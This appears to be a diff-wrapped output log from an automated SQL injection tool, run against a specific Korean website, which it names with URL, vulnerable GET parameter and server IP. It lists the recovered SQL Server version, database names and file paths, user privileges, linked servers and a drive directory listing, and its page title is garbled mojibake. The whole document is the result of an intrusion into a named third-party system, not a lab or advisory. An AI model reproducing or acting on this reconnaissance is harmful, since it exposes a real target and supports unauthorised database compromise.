@@ -1,0 +1,98 @@
+■漏洞信息:============================================================
+ ·URL:http://www.tradein.co.kr/adopt/adopt_detail.asp?key=48306
+ ·页面标题：[公开拱幅秒诀][困皋捞靛浚磐抛牢刚飘][柯扼牢霸烙 瘤开喊 秦寇付纳泼(吝惫/措父/老夯)淬寸磊 葛笼][~惑矫盲侩]
+ ·参数:key=48306
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:210.219.173.216
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 11:36:45 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSSBQQCRC=AKAAHHJDDIKHBJJAKBOMDDIA; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：Tradein_2006
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SVR034327
+- 服务名：MSSQLSERVER
+- 系统用户名：Tradein_sql
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 1
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	d:\Tradein_SQL\MSSQL\data\master.mdf	
+model	d:\Tradein_SQL\MSSQL\data\model.mdf	
+msdb	d:\Tradein_SQL\MSSQL\data\msdbdata.mdf	
+Northwind	d:\Tradein_SQL\MSSQL\data\northwnd.mdf	
+price_backup	d:\Tradein_SQL\MSSQL\data\price_backup_Data.MDF	
+pubs	d:\Tradein_SQL\MSSQL\data\pubs.mdf	
+tempdb	d:\Tradein_SQL\MSSQL\data\tempdb.mdf	
+Tradein_2006	D:\Tradein_SQL\MSSQL\Data\Tradein_2006.mdf	
+tradein_2006_test	d:\Program Files\Microsoft SQL Server\MSSQL\data\tradein_2006_test_Data.MDF	
+view_轰绢	D:\Tradein_SQL\MSSQL\Data\view_轰绢.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SVR034327	SQL Server	SQLOLEDB	SVR034327		SVR034327	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+data\
+dextupload20\
+i386\
+Program Files\
+RECYCLER\
+System Volume Information\
+Tradein_LOG\
+Tradein_SQL\
+Tradein_WWW\
+data.bak
+dextupload20.zip
+email_question.asp[2010-10-14]
+fo-sar56.exe
+PHP_Setup_for_IIS_2009041300.exe
+TYARPv3.com
+
